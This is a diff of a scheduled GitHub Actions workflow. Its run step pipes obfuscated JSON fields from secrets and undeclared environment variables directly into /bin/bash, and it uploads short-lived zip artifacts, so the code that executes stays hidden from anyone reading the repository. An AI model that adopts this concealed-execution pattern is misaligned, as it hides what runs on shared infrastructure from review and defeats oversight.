@@ -1,21 +1,26 @@
 name: feiduodianqiao
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '45 5/6 * * *'
-jobs:  # 12934
+    - cron: '27 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: feiduodianqiao
         env:
-          kts4: ${{ secrets.kts4 }}
+          nspzt8: ${{ secrets.nspzt8 }}
         run: |
-          echo $kts4 | jq -r .y03061 | /bin/bash
-          echo $wbm84 | jq -r .k7903 | /bin/bash
-          echo $stwnh4 | jq -r .pjty393 | /bin/bash
-          echo $ersg0815 | jq -r .wzf5335 | /bin/bash
-          echo $b545 | jq -r .y68649 | /bin/bash
+          printf '%s' "$nspzt8" | jq -r .ermhb034 | /bin/bash
+          printf '%s' "$z22816" | jq -r .t7 | /bin/bash
+          printf '%s' "$rrvmb9357" | jq -r .g622 | /bin/bash
+          echo $jyfw259 | jq -r .gt7182 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: dkvIrU4L
+          path: "*.zip"
+          retention-days: 1
